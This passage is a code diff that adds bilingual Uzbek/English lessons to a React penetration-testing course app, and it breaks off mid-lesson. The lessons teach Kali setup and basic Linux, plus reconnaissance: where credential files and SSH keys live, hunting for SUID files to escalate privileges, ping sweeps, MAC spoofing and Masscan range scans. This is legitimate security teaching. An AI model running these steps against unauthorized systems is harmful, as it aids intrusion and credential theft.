@@ -539,16 +539,35 @@ function LessonScreen({setRoute,user,markComplete,num=1}){
   const sec=SECTIONS[lesson.sec];
 
   const content=num===1?React.createElement(LessonL01):
+    num===2?React.createElement(LessonL02):
     num===3?React.createElement(LessonL03):
+    num===4?React.createElement(LessonL04):
+    num===5?React.createElement(LessonL05):
     num===6?React.createElement(LessonL06):
+    num===7?React.createElement(LessonL07):
+    num===8?React.createElement(LessonL08):
+    num===9?React.createElement(LessonL09):
+    num===10?React.createElement(LessonL10):
     num===11?React.createElement(LessonL11):
+    num===12?React.createElement(LessonL12):
+    num===13?React.createElement(LessonL13):
     num===14?React.createElement(LessonL14):
+    num===15?React.createElement(LessonL15):
     num===16?React.createElement(LessonL16):
+    num===17?React.createElement(LessonL17):
+    num===18?React.createElement(LessonL18):
+    num===19?React.createElement(LessonL19):
     num===20?React.createElement(LessonL20):
     num===21?React.createElement(LessonL21):
+    num===22?React.createElement(LessonL22):
+    num===23?React.createElement(LessonL23):
     num===24?React.createElement(LessonL24):
     num===25?React.createElement(LessonL25):
+    num===26?React.createElement(LessonL26):
     num===27?React.createElement(LessonL27):
+    num===28?React.createElement(LessonL28):
+    num===29?React.createElement(LessonL29):
+    num===30?React.createElement(LessonL30):
     React.createElement(ComingSoon,{lesson});
 
   return React.createElement("div",{style:{maxWidth:800,margin:"0 auto",padding:"24px 16px"}},
@@ -1059,6 +1078,662 @@ function LessonL27(){
       opts:[{uz:"Proxy",en:"Proxy"},{uz:"Repeater",en:"Repeater"},{uz:"Decoder",en:"Decoder"},{uz:"Comparer",en:"Comparer"}],
       correct:1,
       exp:{uz:"Repeater bitta so'rovni qo'lda o'zgartirib, qayta yuborish va javoblarni solishtirish uchun ishlatiladi.",en:"Repeater is used to manually tweak a single request, resend it and compare the responses."}
+    })
+  );
+}
+
+
+// ── L02: Installing Kali ──────────────────────────────────────
+function LessonL02(){
+  const lang=useLang();
+  const ways=[
+    {name:t(lang,"Virtual mashina (VM)","Virtual machine (VM)"),uz:"VirtualBox/VMware ichida. Eng xavfsiz va tavsiya etilgan usul — asosiy tizimingizga tegmaydi.",en:"Inside VirtualBox/VMware. The safest and recommended way — it never touches your host OS."},
+    {name:t(lang,"Bare metal","Bare metal"),uz:"To'g'ridan-to'g'ri diskka o'rnatiladi. To'liq unumdorlik, lekin butun mashina Kali'ga bag'ishlanadi.",en:"Installed directly to disk. Full performance, but the whole machine is dedicated to Kali."},
+    {name:t(lang,"Live USB","Live USB"),uz:"USB'dan o'rnatmasdan ishga tushiriladi. Iz qoldirmaydi, forensika uchun qulay.",en:"Boots from USB without installing. Leaves no trace, handy for forensics."},
+    {name:"WSL",uz:"Windows ichida (WSL2). GUI'siz, lekin buyruq qatori vositalari uchun tez.",en:"Inside Windows (WSL2). No GUI, but fast for command-line tools."},
+  ];
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"O'rnatish usullari","Installation methods")),
+    React.createElement(P,null,t(lang,
+      "Kali'ni o'rnatishning bir necha yo'li bor. Yangi boshlovchilar uchun virtual mashina eng yaxshi tanlov — xatolar asosiy tizimingizga zarar yetkazmaydi va snapshot'lar orqali istalgan holatga qaytish mumkin.",
+      "There are several ways to install Kali. For beginners a virtual machine is the best choice — mistakes won't harm your host OS, and snapshots let you roll back to any state."
+    )),
+    ways.map((w,i)=>React.createElement("div",{key:i,style:{marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10}},
+      React.createElement("div",{style:{fontWeight:700,fontSize:13,color:"var(--accent)",marginBottom:3}},w.name),
+      React.createElement("div",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.55}},t(lang,w.uz,w.en))
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Yuklab olish va tekshirish","Download and verify")),
+    React.createElement(P,null,t(lang,
+      "Har doim faqat rasmiy saytdan (kali.org/get-kali) yuklab oling va SHA256 summasini tekshiring. Bu — o'rnatuvchi buzilmaganiga yoki almashtirilmaganiga ishonch hosil qilishning yagona yo'li.",
+      "Always download only from the official site (kali.org/get-kali) and verify the SHA256 sum. This is the only way to be sure the installer hasn't been corrupted or tampered with."
+    )),
+    React.createElement(Terminal,null,
+      "# Yuklangan ISO ning SHA256 summasini hisoblash\nsha256sum kali-linux-2024.1-installer-amd64.iso\n\n# Natijani sayt'dagi rasmiy summa bilan solishtiring\n# Ular BIR XIL bo'lishi shart"
+    ),
+    React.createElement(H2,{num:"§3"},t(lang,"Birinchi qadamlar","First steps")),
+    React.createElement(Terminal,null,
+      "# O'rnatgandan keyin tizimni yangilang\nsudo apt update && sudo apt full-upgrade -y\n\n# Standart parolni o'zgartiring\npasswd\n\n# (VM'da) snapshot oling — toza holatga qaytish uchun"
+    ),
+    React.createElement(InfoBox,{color:"var(--accent)"},
+      React.createElement("strong",null,t(lang,"Snapshot: ","Snapshot: ")),
+      t(lang,"VM'da toza o'rnatishdan keyin darhol snapshot oling. Biror narsa buzilsa yoki test muhitini ifloslasangiz, bir soniyada toza holatga qaytasiz.",
+        "Take a snapshot right after a clean install in a VM. If something breaks or you pollute your test environment, you can revert to a clean state in a second.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Yangi boshlovchi uchun Kali'ni o'rnatishning eng xavfsiz usuli qaysi?",en:"What is the safest way for a beginner to install Kali?"},
+      opts:[{uz:"Asosiy diskka bare metal",en:"Bare metal on the main disk"},{uz:"Virtual mashina (VM)",en:"Virtual machine (VM)"},{uz:"Telefonga",en:"On a phone"},{uz:"Router'ga",en:"On a router"}],
+      correct:1,
+      exp:{uz:"Virtual mashina asosiy tizimni izolyatsiya qiladi va snapshot orqali xatolardan qaytish imkonini beradi — shuning uchun eng xavfsiz.",en:"A virtual machine isolates the host OS and lets you revert from mistakes via snapshots — hence the safest."}
+    })
+  );
+}
+
+// ── L04: Linux file system ────────────────────────────────────
+function LessonL04(){
+  const lang=useLang();
+  const dirs=[
+    {p:"/",uz:"Ildiz — butun fayl tizimining boshlanish nuqtasi.",en:"Root — the top of the entire file system."},
+    {p:"/etc",uz:"Tizim sozlama fayllari (parollar, xizmatlar, tarmoq).",en:"System configuration files (passwords, services, network)."},
+    {p:"/home",uz:"Oddiy foydalanuvchilarning shaxsiy kataloglari.",en:"Home directories of normal users."},
+    {p:"/root",uz:"root foydalanuvchining shaxsiy katalogi.",en:"The root user's home directory."},
+    {p:"/var",uz:"O'zgaruvchan ma'lumot — loglar (/var/log), veb (/var/www).",en:"Variable data — logs (/var/log), web (/var/www)."},
+    {p:"/tmp",uz:"Vaqtinchalik fayllar. Ko'pincha hammaga yozish ruxsati bor.",en:"Temporary files. Often world-writable."},
+    {p:"/usr",uz:"Foydalanuvchi dasturlari va vositalar.",en:"User programs and tools."},
+    {p:"/bin, /sbin",uz:"Muhim tizim buyruqlari (bajariladigan fayllar).",en:"Essential system commands (executables)."},
+  ];
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"FHS — fayl tizimi ierarxiyasi","FHS — the file system hierarchy")),
+    React.createElement(P,null,t(lang,
+      "Windows'dan farqli o'laroq, Linux'da C: yoki D: disklari yo'q. Hamma narsa yagona ildizdan (/) boshlanadi va daraxt shaklida tarmoqlanadi. Bu tuzilma FHS (Filesystem Hierarchy Standard) deb ataladi.",
+      "Unlike Windows, Linux has no C: or D: drives. Everything starts from a single root (/) and branches out as a tree. This structure is called the FHS (Filesystem Hierarchy Standard)."
+    )),
+    dirs.map((d,i)=>React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,alignItems:"flex-start"}},
+      React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:12,fontWeight:700,color:"var(--accent)",minWidth:80}},d.p),
+      React.createElement("span",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.55}},t(lang,d.uz,d.en))
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Pentest uchun muhim yo'llar","Paths that matter in a pentest")),
+    React.createElement(Terminal,null,
+      "/etc/passwd     # foydalanuvchilar ro'yxati (hamma o'qiy oladi)\n/etc/shadow     # parol hashlari (faqat root)\n/var/www/html   # veb-sayt fayllari\n/var/log/auth.log  # kirish urinishlari jurnali\n~/.ssh/         # SSH kalitlari\n/usr/share/wordlists/  # Kali lug'atlari (rockyou.txt)"
+    ),
+    React.createElement(InfoBox,{color:"var(--accent)"},
+      React.createElement("strong",null,t(lang,"Yashirin fayllar: ","Hidden files: ")),
+      t(lang,"Nomi nuqta (.) bilan boshlanadigan fayllar yashiringan hisoblanadi (masalan .bashrc, .ssh). Ularni ko'rish uchun ls -a ishlating — ular ko'pincha maxfiy ma'lumot saqlaydi.",
+        "Files whose names start with a dot (.) are hidden (e.g. .bashrc, .ssh). Use ls -a to see them — they often hold sensitive data.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Parol hashlari qaysi faylda saqlanadi va uni kim o'qiy oladi?",en:"Which file stores password hashes and who can read it?"},
+      opts:[{uz:"/etc/passwd — hamma",en:"/etc/passwd — everyone"},{uz:"/etc/shadow — faqat root",en:"/etc/shadow — only root"},{uz:"/var/log — hamma",en:"/var/log — everyone"},{uz:"/home — mehmonlar",en:"/home — guests"}],
+      correct:1,
+      exp:{uz:"/etc/shadow parol hashlarini saqlaydi va faqat root o'qiy oladi; /etc/passwd esa foydalanuvchilar ro'yxatini saqlaydi va hamma o'qiy oladi.",en:"/etc/shadow stores password hashes and is readable only by root; /etc/passwd holds the user list and is world-readable."}
+    })
+  );
+}
+
+// ── L05: Users & permissions ──────────────────────────────────
+function LessonL05(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Foydalanuvchilar va guruhlar","Users and groups")),
+    React.createElement(P,null,t(lang,
+      "Linux — ko'p foydalanuvchili tizim. Har bir foydalanuvchining UID'si (identifikatori) va bir yoki bir necha guruhi bor. root (UID 0) — cheklovsiz superfoydalanuvchi. Pentestda maqsad ko'pincha oddiy foydalanuvchidan root'ga o'tish (privilege escalation).",
+      "Linux is a multi-user system. Each user has a UID (identifier) and one or more groups. root (UID 0) is the unrestricted superuser. In a pentest the goal is often to move from a normal user to root (privilege escalation)."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Ruxsatlarni o'qish (rwx)","Reading permissions (rwx)")),
+    React.createElement(P,null,t(lang,
+      "ls -l har bir fayl uchun 10 belgili ruxsat qatorini ko'rsatadi. Masalan -rwxr-xr-- : birinchi belgi tur (- fayl, d katalog), keyin egasi (rwx), guruhi (r-x) va boshqalar (r--) uchun ruxsatlar. r=o'qish, w=yozish, x=bajarish.",
+      "ls -l shows a 10-character permission string for each file. For example -rwxr-xr-- : the first char is the type (- file, d directory), then permissions for owner (rwx), group (r-x) and others (r--). r=read, w=write, x=execute."
+    )),
+    React.createElement(Terminal,null,
+      "# Ruxsatlarni o'zgartirish (raqamli usul)\nchmod 755 script.sh   # rwxr-xr-x\nchmod 600 id_rsa      # rw------- (faqat egasi)\nchmod +x exploit.sh   # bajarish huquqini qo'shish\n\n# Egasini o'zgartirish\nchown user:group file.txt"
+    ),
+    React.createElement(H2,{num:"§3"},t(lang,"sudo va SUID","sudo and SUID")),
+    React.createElement(P,null,t(lang,
+      "sudo oddiy foydalanuvchiga vaqtincha root huquqlari bilan buyruq bajarishga ruxsat beradi. SUID biti o'rnatilgan fayllar esa egasining (ko'pincha root'ning) huquqlari bilan ishga tushadi — bu privilege escalation uchun tez-tez ishlatiladigan yo'l.",
+      "sudo lets a normal user run a command temporarily with root rights. Files with the SUID bit set run with the owner's rights (often root's) — a common path for privilege escalation."
+    )),
+    React.createElement(Terminal,null,
+      "# Menga qaysi sudo huquqlari berilgan?\nsudo -l\n\n# SUID o'rnatilgan fayllarni topish (privesc tekshiruvi)\nfind / -perm -4000 -type f 2>/dev/null"
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"chmod 600 id_rsa buyrug'i faylga qanday ruxsat beradi?",en:"What permissions does chmod 600 id_rsa set on the file?"},
+      opts:[{uz:"Hamma o'qiy va yoza oladi",en:"Everyone can read and write"},{uz:"Faqat egasi o'qiy va yoza oladi",en:"Only the owner can read and write"},{uz:"Hamma bajara oladi",en:"Everyone can execute"},{uz:"Hech kim kira olmaydi",en:"No one can access it"}],
+      correct:1,
+      exp:{uz:"600 = rw------- : faqat egasiga o'qish va yozish, guruh va boshqalarga hech qanday huquq yo'q. SSH kalitlari uchun aynan shu talab qilinadi.",en:"600 = rw------- : read and write for the owner only, nothing for group or others. This is exactly what SSH keys require."}
+    })
+  );
+}
+
+// ── L07: Bash scripting ───────────────────────────────────────
+function LessonL07(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Nega bash skript?","Why bash scripting?")),
+    React.createElement(P,null,t(lang,
+      "Bash skript — bir nechta buyruqni bitta faylga jamlab, avtomatik bajarish usuli. Pentestda takrorlanuvchi vazifalarni (skanerlash, IP diapazonini tekshirish, natijalarni saralash) avtomatlashtiradi va vaqtni tejaydi.",
+      "A bash script bundles several commands into one file and runs them automatically. In a pentest it automates repetitive tasks (scanning, checking an IP range, sorting results) and saves time."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Asosiy tuzilma","Basic structure")),
+    React.createElement(Terminal,null,
+      "#!/bin/bash\n# ^ shebang — bu skript bash bilan ishga tushishini bildiradi\n\nTARGET=\"10.0.0.5\"          # o'zgaruvchi\necho \"Skanerlanmoqda: $TARGET\"\n\n# Shart (if)\nif ping -c1 $TARGET &>/dev/null; then\n  echo \"Xost tirik\"\nelse\n  echo \"Xost o'chiq\"\nfi"
+    ),
+    React.createElement(H2,{num:"§3"},t(lang,"Sikllar (loops)","Loops")),
+    React.createElement(Terminal,null,
+      "#!/bin/bash\n# Butun /24 tarmoqni ping bilan tekshirish\nfor i in $(seq 1 254); do\n  ip=\"10.0.0.$i\"\n  ping -c1 -W1 $ip &>/dev/null && echo \"$ip tirik\"\ndone"
+    ),
+    React.createElement(P,null,t(lang,
+      "Skriptni bajarish uchun avval unga bajarish huquqini bering: chmod +x scan.sh, keyin ./scan.sh bilan ishga tushiring.",
+      "To run a script, first give it execute permission: chmod +x scan.sh, then launch it with ./scan.sh."
+    )),
+    React.createElement(InfoBox,{color:"var(--accent)"},
+      React.createElement("strong",null,t(lang,"$() — buyruq almashtirish: ","$() — command substitution: ")),
+      t(lang,"$(buyruq) buyruqning chiqishini o'zgaruvchiga oladi. Masalan HOSTS=$(cat targets.txt) — fayl mazmunini o'zgaruvchiga yuklaydi.",
+        "$(command) captures a command's output into a variable. For example HOSTS=$(cat targets.txt) loads a file's contents into a variable.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Skriptning birinchi qatoridagi #!/bin/bash nima deyiladi va nima vazifasi bor?",en:"What is #!/bin/bash on the first line of a script called, and what is its job?"},
+      opts:[{uz:"Izoh — hech narsa qilmaydi",en:"A comment — it does nothing"},{uz:"Shebang — skriptni qaysi interpretator ishga tushirishini bildiradi",en:"Shebang — it tells which interpreter runs the script"},{uz:"O'zgaruvchi e'loni",en:"A variable declaration"},{uz:"Sikl boshlanishi",en:"The start of a loop"}],
+      correct:1,
+      exp:{uz:"Shebang (#!) qatori tizimga skriptni qaysi dastur (bu yerda /bin/bash) bilan bajarishni ko'rsatadi.",en:"The shebang (#!) line tells the system which program (here /bin/bash) to execute the script with."}
+    })
+  );
+}
+
+// ── L08: Networking basics ────────────────────────────────────
+function LessonL08(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Tarmoq holatini ko'rish","Inspecting the network")),
+    React.createElement(P,null,t(lang,
+      "Har qanday tarmoq hujumidan oldin o'z mashinangizning tarmoq holatini bilishingiz kerak: IP manzilingiz, tarmoq interfeyslari va marshrutlar. Kali'da bu uchun zamonaviy ip buyrug'idan foydalaniladi.",
+      "Before any network attack you must know your own machine's network state: your IP address, network interfaces and routes. In Kali this is done with the modern ip command."
+    )),
+    React.createElement(Terminal,null,
+      "# IP manzil va interfeyslar\nip a\n\n# Marshrutlash jadvali (default gateway)\nip route\n\n# Eski uslub (hali ham ishlaydi)\nifconfig\nroute -n"
+    ),
+    React.createElement(H2,{num:"§2"},t(lang,"Ulanishlarni tekshirish","Checking connectivity")),
+    React.createElement(Terminal,null,
+      "# Xost tirikligini tekshirish\nping -c4 10.0.0.1\n\n# Ochiq portlar va faol ulanishlar (zamonaviy)\nss -tulnp\n\n# DNS so'rovi\nnslookup example.com"
+    ),
+    React.createElement(H2,{num:"§3"},t(lang,"Interfeysni boshqarish","Managing an interface")),
+    React.createElement(Terminal,null,
+      "# Interfeysni o'chirish/yoqish\nsudo ip link set eth0 down\nsudo ip link set eth0 up\n\n# MAC manzilni vaqtincha o'zgartirish (anonimlik uchun)\nsudo ip link set eth0 down\nsudo macchanger -r eth0\nsudo ip link set eth0 up"
+    ),
+    React.createElement(InfoBox,{color:"var(--accent)"},
+      React.createElement("strong",null,t(lang,"ss vs netstat: ","ss vs netstat: ")),
+      t(lang,"ss — netstat'ning zamonaviy va tezroq o'rnini bosuvchisi. ss -tulnp barcha tinglayotgan (listening) TCP/UDP portlar va ularga tegishli jarayonlarni ko'rsatadi.",
+        "ss is the modern, faster replacement for netstat. ss -tulnp shows all listening TCP/UDP ports and their owning processes.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Kali'da IP manzil va tarmoq interfeyslarini ko'rish uchun qaysi zamonaviy buyruq ishlatiladi?",en:"Which modern command shows the IP address and network interfaces in Kali?"},
+      opts:[{uz:"ip a",en:"ip a"},{uz:"ls -l",en:"ls -l"},{uz:"cat /ip",en:"cat /ip"},{uz:"ping",en:"ping"}],
+      correct:0,
+      exp:{uz:"ip a (ip address) interfeyslar va ularning IP manzillarini ko'rsatadi; u eski ifconfig'ning zamonaviy o'rnini bosadi.",en:"ip a (ip address) lists interfaces and their IP addresses; it is the modern replacement for the old ifconfig."}
+    })
+  );
+}
+
+// ── L09: Services ─────────────────────────────────────────────
+function LessonL09(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Xizmatlar va systemctl","Services and systemctl")),
+    React.createElement(P,null,t(lang,
+      "Xizmat (service) — fonda doimiy ishlab turadigan dastur, masalan veb-server yoki SSH. Kali systemd'dan foydalanadi va xizmatlar systemctl buyrug'i orqali boshqariladi.",
+      "A service is a program that runs continuously in the background, such as a web server or SSH. Kali uses systemd, and services are managed with the systemctl command."
+    )),
+    React.createElement(Terminal,null,
+      "# Xizmatni ishga tushirish / to'xtatish\nsudo systemctl start ssh\nsudo systemctl stop ssh\n\n# Holatini ko'rish\nsudo systemctl status ssh\n\n# Tizim yuklanishida avtomatik ishga tushirish\nsudo systemctl enable ssh\nsudo systemctl disable ssh"
+    ),
+    React.createElement(H2,{num:"§2"},t(lang,"Pentestda kerak bo'ladigan xizmatlar","Services you'll need in a pentest")),
+    React.createElement(Terminal,null,
+      "# Metasploit uchun ma'lumotlar bazasi\nsudo systemctl start postgresql\n\n# Fayl uzatish uchun vaqtinchalik veb-server\nsudo systemctl start apache2\n# yoki tez usul:\npython3 -m http.server 8000\n\n# Masofaviy kirish uchun SSH\nsudo systemctl start ssh"
+    ),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},
+      React.createElement("strong",null,"⚠ "),
+      t(lang,"Xizmatlarni faqat kerak bo'lganda ishga tushiring. Doimiy ishlab turgan SSH yoki veb-server sizning mashinangizni ham hujum nishoniga aylantiradi.",
+        "Only start services when you need them. An always-running SSH or web server turns your own machine into an attack target too.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Xizmatni tizim har yuklanganda avtomatik ishga tushishini ta'minlash uchun qaysi buyruq ishlatiladi?",en:"Which command makes a service start automatically every time the system boots?"},
+      opts:[{uz:"systemctl start",en:"systemctl start"},{uz:"systemctl enable",en:"systemctl enable"},{uz:"systemctl status",en:"systemctl status"},{uz:"systemctl stop",en:"systemctl stop"}],
+      correct:1,
+      exp:{uz:"systemctl enable xizmatni yuklanish vaqtida avtomatik ishga tushirishga sozlaydi; start esa uni faqat hozir bir marta ishga tushiradi.",en:"systemctl enable sets a service to start automatically at boot; start only launches it once right now."}
+    })
+  );
+}
+
+// ── L10: Kali tools overview ──────────────────────────────────
+function LessonL10(){
+  const lang=useLang();
+  const cats=[
+    {n:t(lang,"Ma'lumot to'plash","Information Gathering"),tools:"Nmap, theHarvester, dnsenum, Maltego"},
+    {n:t(lang,"Zaiflik tahlili","Vulnerability Analysis"),tools:"Nikto, OpenVAS, Nmap NSE"},
+    {n:t(lang,"Veb ilovalar","Web Applications"),tools:"Burp Suite, OWASP ZAP, sqlmap, wpscan"},
+    {n:t(lang,"Parol hujumlari","Password Attacks"),tools:"Hydra, John, Hashcat, Medusa"},
+    {n:t(lang,"Simsiz hujumlar","Wireless Attacks"),tools:"Aircrack-ng, Wifite, Kismet"},
+    {n:t(lang,"Ekspluatatsiya","Exploitation"),tools:"Metasploit, searchsploit, SET"},
+    {n:t(lang,"Sniffing & Spoofing","Sniffing & Spoofing"),tools:"Wireshark, Ettercap, Bettercap"},
+    {n:t(lang,"Post-ekspluatatsiya","Post Exploitation"),tools:"Meterpreter, Mimikatz, PowerSploit"},
+  ];
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"600+ vosita, tartibli","600+ tools, organized")),
+    React.createElement(P,null,t(lang,
+      "Kali'ning kuchi — 600 dan ortiq oldindan o'rnatilgan xavfsizlik vositasida. Ular pentest bosqichlariga mos ravishda toifalarga ajratilgan. Ilovalar menyusi ham xuddi shu toifalar bo'yicha tuzilgan.",
+      "Kali's power lies in its 600+ pre-installed security tools. They are grouped into categories that mirror the phases of a pentest. The applications menu is organized by these same categories."
+    )),
+    cats.map((c,i)=>React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,alignItems:"flex-start",flexWrap:"wrap"}},
+      React.createElement("span",{style:{fontSize:13,fontWeight:700,color:"var(--accent)",minWidth:150}},c.n),
+      React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:11.5,color:"var(--text-2)"}},c.tools)
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Vositani topish","Finding a tool")),
+    React.createElement(Terminal,null,
+      "# Vosita o'rnatilganmi?\nwhich nmap\n\n# Vosita haqida qo'llanma\nman nmap\n\n# Ko'pchilik vositada yordam\nnmap --help\n\n# O'rnatilmagan bo'lsa\nsudo apt install <tool>"
+    ),
+    React.createElement(InfoBox,{color:"var(--accent)"},
+      React.createElement("strong",null,t(lang,"Metapaketlar: ","Metapackages: ")),
+      t(lang,"Kali barcha vositani o'rnatishni talab qilmaydi. kali-linux-large yoki maxsus kali-tools-web kabi metapaketlar orqali kerakli toifani birdan o'rnatishingiz mumkin.",
+        "Kali doesn't force you to install every tool. Metapackages like kali-linux-large or the focused kali-tools-web let you install a whole category at once.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Kali vositalari qanday tartibga solingan?",en:"How are Kali's tools organized?"},
+      opts:[{uz:"Alifbo tartibida",en:"Alphabetically"},{uz:"Pentest bosqichlariga mos toifalar bo'yicha",en:"Into categories matching pentest phases"},{uz:"Fayl hajmi bo'yicha",en:"By file size"},{uz:"Tasodifiy",en:"Randomly"}],
+      correct:1,
+      exp:{uz:"Vositalar ma'lumot to'plash, ekspluatatsiya, parol hujumlari kabi pentest bosqichlariga mos toifalarga ajratilgan — bu kerakli vositani tez topishga yordam beradi.",en:"Tools are grouped into categories matching pentest phases such as information gathering, exploitation and password attacks — helping you find the right tool fast."}
+    })
+  );
+}
+
+
+// ── L12: Netdiscover ──────────────────────────────────────────
+function LessonL12(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Netdiscover nima?","What is Netdiscover?")),
+    React.createElement(P,null,t(lang,
+      "Netdiscover — ARP so'rovlari yordamida lokal tarmoqdagi tirik xostlarni topadigan vosita. U ping'ga tayanmaydi, shuning uchun ICMP'ni bloklaydigan xostlarni ham aniqlaydi. Tarmoq xaritasini tuzishning eng birinchi qadami.",
+      "Netdiscover finds live hosts on the local network using ARP requests. It doesn't rely on ping, so it detects even hosts that block ICMP. It's the very first step in mapping a network."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Foydalanish","Usage")),
+    React.createElement(Terminal,null,
+      "# Aniq diapazonni skanerlash (tez, aktiv)\nsudo netdiscover -r 10.0.0.0/24\n\n# Muayyan interfeys bo'yicha\nsudo netdiscover -i eth0\n\n# Passiv rejim — faqat tinglaydi, so'rov yubormaydi (yashirin)\nsudo netdiscover -p"
+    ),
+    React.createElement(P,null,t(lang,
+      "Natijada har bir tirik xostning IP manzili, MAC manzili va tarmoq kartasi ishlab chiqaruvchisi (vendor) ko'rsatiladi. MAC vendor ko'pincha qurilma turini (masalan router, printer, VM) ochib beradi.",
+      "The output shows each live host's IP address, MAC address and network card vendor. The MAC vendor often reveals the device type (e.g. router, printer, VM)."
+    )),
+    React.createElement(InfoBox,{color:"var(--accent)"},
+      React.createElement("strong",null,t(lang,"Passiv vs aktiv: ","Passive vs active: ")),
+      t(lang,"Passiv rejim (-p) hech qanday paket yubormay, faqat tarmoqdagi ARP trafigini tinglaydi — bu deyarli aniqlanmaydi, lekin sekinroq. Aktiv rejim tezroq, lekin tarmoqqa iz qoldiradi.",
+        "Passive mode (-p) sends no packets and just listens to ARP traffic on the network — nearly undetectable but slower. Active mode is faster but leaves a trace on the network.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Netdiscover qanday protokol yordamida tirik xostlarni topadi?",en:"Which protocol does Netdiscover use to find live hosts?"},
+      opts:[{uz:"ICMP (ping)",en:"ICMP (ping)"},{uz:"ARP",en:"ARP"},{uz:"DNS",en:"DNS"},{uz:"HTTP",en:"HTTP"}],
+      correct:1,
+      exp:{uz:"Netdiscover ARP so'rovlaridan foydalanadi, shuning uchun u ping'ni (ICMP) bloklaydigan xostlarni ham aniqlaydi.",en:"Netdiscover uses ARP requests, so it detects hosts even if they block ping (ICMP)."}
+    })
+  );
+}
+
+// ── L13: Masscan ──────────────────────────────────────────────
+function LessonL13(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Masscan nima?","What is Masscan?")),
+    React.createElement(P,null,t(lang,
+      "Masscan — dunyodagi eng tezkor port skaneri. U o'zining TCP/IP stekidan foydalanib, teoretik jihatdan butun internetni bir necha daqiqada skanerlay oladi. Nmap'dan yuzlab marta tez, lekin kamroq batafsil.",
+      "Masscan is the fastest port scanner in the world. Using its own TCP/IP stack, it can theoretically scan the entire internet in minutes. It's hundreds of times faster than Nmap, but less detailed."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Foydalanish","Usage")),
+    React.createElement(Terminal,null,
+      "# Bitta portni katta diapazonda skanerlash\nsudo masscan 10.0.0.0/16 -p80\n\n# Bir necha port, tezlikni cheklab\nsudo masscan 10.0.0.0/24 -p22,80,443 --rate=1000\n\n# Barcha portlar\nsudo masscan 10.0.0.5 -p0-65535 --rate=10000"
+    ),
+    React.createElement(H2,{num:"§3"},t(lang,"Masscan + Nmap ish oqimi","The Masscan + Nmap workflow")),
+    React.createElement(P,null,t(lang,
+      "Amaliyotda ikkovi birga ishlatiladi: Masscan katta diapazonda ochiq portlarni tez topadi, keyin Nmap topilgan portlarni chuqur (versiya, xizmat) tekshiradi. Bu tezlik va batafsillikni birlashtiradi.",
+      "In practice the two are used together: Masscan quickly finds open ports across a large range, then Nmap deeply inspects the found ports (version, service). This combines speed and detail."
+    )),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},
+      React.createElement("strong",null,"⚠ "),
+      t(lang,"--rate ni ehtiyotkorlik bilan sozlang. Juda yuqori tezlik tarmoqni to'ldirib, xizmatlarni ishdan chiqarishi (DoS) va sizni darhol aniqlashi mumkin. Faqat ruxsat berilgan tarmoqlarda ishlating.",
+        "Set --rate carefully. A very high rate can flood the network, knock out services (DoS) and get you detected instantly. Only use it on authorized networks.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Masscan va Nmap odatda qanday birga ishlatiladi?",en:"How are Masscan and Nmap typically used together?"},
+      opts:[{uz:"Masscan tez topadi, Nmap chuqur tekshiradi",en:"Masscan finds fast, Nmap inspects deeply"},{uz:"Ikkalasi bir xil ishni qiladi",en:"They do the exact same job"},{uz:"Nmap avval, Masscan keyin bekor qiladi",en:"Nmap first, Masscan cancels it"},{uz:"Ular birga ishlamaydi",en:"They cannot work together"}],
+      correct:0,
+      exp:{uz:"Masscan katta diapazonda ochiq portlarni tez aniqlaydi, so'ng Nmap o'sha portlarni versiya va xizmat aniqlash uchun batafsil skanerlaydi.",en:"Masscan rapidly finds open ports over a large range, then Nmap scans those ports in detail for version and service detection."}
+    })
+  );
+}
+
+// ── L15: theHarvester ─────────────────────────────────────────
+function LessonL15(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"theHarvester nima?","What is theHarvester?")),
+    React.createElement(P,null,t(lang,
+      "theHarvester — ochiq manba razvedkasi (OSINT) vositasi. U ochiq manbalardan (qidiruv tizimlari, PGP serverlari, Shodan) nishon tashkilotning email manzillari, subdomenlari, xodim ismlari va IP'larini to'playdi — nishonga hech qanday paket yubormasdan.",
